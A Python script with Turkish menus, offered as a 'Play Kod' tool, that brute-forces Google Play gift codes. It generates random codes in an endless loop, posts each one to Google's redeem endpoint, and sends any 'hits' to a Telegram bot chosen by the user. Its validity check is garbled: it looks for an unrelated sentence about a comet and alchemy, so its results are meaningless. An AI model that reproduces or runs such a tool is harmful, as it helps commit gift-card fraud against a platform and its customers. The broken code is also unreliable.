import requests
import os
import rich
import random
import time
#------------------RENKLER---------------#
P = '\033[2;35m'
B = '\033[1;97m'
K = '\033[1;31m'
Y = '\033[2;32m'
S = '\033[1;33m'
by = '@pythonwizard'
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
BBlue = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'
#------------------RENKLER---------------#
say = 0
logo = f'''{B}▬▬▬▬▬▬▬▬▬▬▬▬▬𝐏𝐘𝐓𝐇𝐎𝐍▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{S}\n   ⠄⠄⠄⠄⠄⠄⣀⣀⣤⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣄⣀⡀⠄⠄⠄⠄⠄\n   ⠄⠄⠄⠄⣴⣿⣿⡿⣿⢿⣟⣿⣻⣟⡿⣟⣿⣟⡿⣟⣿⣻⣟⣿⣻⢿⣻⡿⣿⢿⣷⣆⠄⠄⠄\n   ⠄⠄⠄⢘⣿⢯⣷⡿⡿⡿⢿⢿⣷⣯⡿⣽⣞⣷⣻⢯⣷⣻⣾⡿⡿⢿⢿⢿⢯⣟⣞⡮⡀⠄⠄\n   ⠄⠄⠄⢸⢞⠟⠃⣉⢉⠉⠉⠓⠫⢿⣿⣷⢷⣻⣞⣿⣾⡟⠽⠚⠊⠉⠉⠉⠙⠻⣞⢵⠂⠄⠄\n   ⠄⠄⠄⢜⢯⣺⢿⣻⣿⣿⣷⣔⡄⠄⠈⠛⣿⣿⡾⠋⠁⠄⠄⣄⣶⣾⣿⡿⣿⡳⡌⡗⡅⠄⠄\n   ⠄⠄⠄⢽⢱⢳⢹⡪⡞⠮⠯⢯⡻⡬⡐⢨⢿⣿⣿⢀⠐⡥⣻⡻⠯⡳⢳⢹⢜⢜⢜⢎⠆⠄⠄\n   ⠄⠄⠠⣻⢌⠘⠌⡂⠈⠁⠉⠁⠘⠑⢧⣕⣿⣿⣿⢤⡪⠚⠂⠈⠁⠁⠁⠂⡑⠡⡈⢮⠅⠄⠄\n   ⠄⠄⠠⣳⣿⣿⣽⣭⣶⣶⣶⣶⣶⣺⣟⣾⣻⣿⣯⢯⢿⣳⣶⣶⣶⣖⣶⣮⣭⣷⣽⣗⠍⠄⠄\n   ⠄⠄⢀⢻⡿⡿⣟⣿⣻⣽⣟⣿⢯⣟⣞⡷⣿⣿⣯⢿⢽⢯⣿⣻⣟⣿⣻⣟⣿⣻⢿⣿⢀⠄⠄\n   ⠄⠄⠄⡑⡏⠯⡯⡳⡯⣗⢯⢟⡽⣗⣯⣟⣿⣿⣾⣫⢿⣽⠾⡽⣺⢳⡫⡞⡗⡝⢕⠕⠄⠄⠄\n   ⠄⠄⠄⢂⡎⠅⡃⢇⠇⠇⣃⣧⡺⡻⡳⡫⣿⡿⣟⠞⠽⠯⢧⣅⣃⠣⠱⡑⡑⠨⢐⢌⠂⠄⠄\n   ⠄⠄⠄⠐⠼⣦⢀⠄⣶⣿⢿⣿⣧⣄⡌⠂⠢⠩⠂⠑⣁⣅⣾⢿⣟⣷⠦⠄⠄⡤⡇⡪⠄⠄⠄\n   ⠄⠄⠄⠄⠨⢻⣧⡅⡈⠛⠿⠿⠿⠛⠁⠄⢀⡀⠄⠄⠘⠻⠿⠿⠯⠓⠁⢠⣱⡿⢑⠄⠄⠄⠄\n   ⠄⠄⠄⠄⠈⢌⢿⣷⡐⠤⣀⣀⣂⣀⢀⢀⡓⠝⡂⡀⢀⢀⢀⣀⣀⠤⢊⣼⡟⡡⡁⠄⠄⠄⠄\n   ⠄⠄⠄⠄⠄⠈⢢⠚⣿⣄⠈⠉⠛⠛⠟⠿⠿⠟⠿⠻⠻⠛⠛⠉⠄⣠⠾⢑⠰⠈⠄⠄⠄⠄⠄\n   ⠄⠄⠄⠄⠄⠄⠄⠑⢌⠿⣦⡡⣱⣸⣸⣆⠄⠄⠄⣰⣕⢔⢔⠡⣼⠞⡡⠁⠁⠄⠄⠄⠄⠄⠄\n   ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠑⢝⢷⣕⡷⣿⡿⠄⠄⠠⣿⣯⣯⡳⡽⡋⠌⠄⠄⠄⠄⠄⠄⠄⠄⠄\n   ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⢮⣿⣽⣯⠄⠄⢨⣿⣿⡷⡫⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\n   ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⠙⠝⠂⠄⢘⠋⠃⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\n                 < 𝐏𝐋𝐀𝐘 𝐊𝐎𝐃 𝐓𝐎𝐎𝐋 >  \n             𝐓𝐆 : @pythonwizard / @wizardxcoder   \n\n {B}▬▬▬▬▬▬▬▬▬▬▬▬▬𝐖𝐈𝐙𝐀𝐑𝐃▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬'''
print(logo)
print()
token = input(P+'𝐓𝐎𝐊𝐄𝐍 𝐆𝐈𝐑 :  '+B)
print('{}_________________________________________________'.format(S))
print()
id = input(P+'𝐈𝐃 𝐆𝐈𝐑 :  '+B)
os.system("clear")
def playkoduret():
  global say
  while True:
   ıss = 'ABCDEFGHIJKLMNOPRSTEUVYZ'
   ısss = str(''.join((random.choice(ıss) for i in range(2))))
   userr = '1234567890'
   uss = str(''.join((random.choice(userr) for i in range(2))))
   uss = str(''.join((random.choice(userr) for i in range(3))))
   baba = 'ABCDEFGHIJKLMNOPRSTEUVYZ1234567890'
   baba1 = 'ABCDEFGHIJKLMNOPRSTEUVYZ1234567890'
   baba2 = 'ABCDEFGHIJKLMNOPRSTEUVYZ1234567890'
   baba3 = 'ABCDEFGHIJKLMNOPRSTEUVYZ1234567890'
   baba4 = 'ABCDEFGHIJKLMNOPRSTEUVYZ1234567890'
   de = '-'
   user = 'SHL7-UA6Q-FRLT-SFMM-GHM8'
   us = str(''.join((random.choice(user) for i in range(7))))
   username = '+20122' + us
   password = '0122' + us
   kod = str(''.join((random.choice(baba) for i in range(4))))
   kod1 = str(''.join((random.choice(baba1) for i in range(4))))
   kod2 = str(''.join((random.choice(baba2) for i in range(4))))
   kod3 = str(''.join((random.choice(baba3) for i in range(4))))
   kod4 = str(''.join((random.choice(baba4) for i in range(4))))
   say += 1
   playkod = f'{kod}{de}{kod1}{de}{kod2}{de}{kod3}{de}{kod4}\n'
   print(f'{B}[{P} {say} {B}]{B} - {P}{playkod}')
   wizardkod = open('playkod.txt', 'a')
   wizardkod.write(playkod)
   time.sleep(0.5)

def playkodsil():
 try:
  os.remove('''playkod.txt''')
  print(Y+'𝙿𝙻𝙰𝚈 𝙺𝙾𝙳 𝙲𝙾𝙼𝙱𝙾 𝙱𝙰𝚂‌𝙰𝚁𝙸𝚈𝙻𝙰 𝚂𝙸‌𝙻𝙸‌𝙽𝙳𝙸‌ :)')
 except:
  exit(K+'𝙿𝙻𝙰𝚈 𝙺𝙾𝙳 𝙲𝙾𝙼𝙱𝙾 𝙱𝚄𝙻𝚄𝙽𝙰𝙼𝙰𝙳𝙸')

def denetle():
    try:
        r=open('playkod.txt','r').readlines()
        for data in r:
            code = data
            url = f"https://play.google.com/redeem?code={code}"
            re = requests.post(url).text
            if 'However, when the comet disappeared and its blessings were no longer available, the use of alchemy gradually declined and was eventually forgotten.' in re:
                print(f'{K}𝐇𝐀𝐓𝐀𝐋𝐈 𝐏𝐋𝐀𝐘 𝐊𝐎𝐃 : {code}   ')
            else:
                print(f'{Y}𝐃𝐎𝐆𝐑𝐔 𝐏𝐋𝐀𝐘 𝐊𝐎𝐃 : {code}    ')
                hitplaykod = f'''
                ⋘─────━𝐖𝐈̇𝐙𝐀𝐑𝐃━─────⋙
                𝐂̧𝐀𝐋𝐈𝐒̧𝐀𝐍 𝐏𝐋𝐀𝐘𝐊𝐎𝐃 : {code}
                ⋘─────━𝐖𝐈̇𝐙𝐀𝐑𝐃━─────⋙
                𝐁𝐘 : {by}   '''
                requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text="+str(hitplaykod))
    except:
     return

def home():
 print(logo)
 print()
 print(f'''
 {B}[{P} 1 {B}]{P} - PLAY KOD COMBO ÇEK
 {B}[{P} 2 {B}]{P} - PLAY KOD COMBO SİL
 {B}[{P} 3 {B}]{P} - PLAY KOD COMBO DENETLE''')
 secim = int(input('\n 𝐒𝐄𝐂‌𝐈𝐍𝐈𝐙 :  '+B))

 os.system("clear")
 if secim == 1:
  print()
  print(logo)
  playkoduret()
 elif secim == 2:
  print()
  print(logo)
  playkodsil()
 elif secim == 3:
  print()
  print(logo)
  denetle()
 else:
  print()
  print(logo)
  print(K+'𝐇𝐀𝐓𝐀𝐋𝐈 𝐒𝐄𝐂‌𝐈𝐌   ')
home()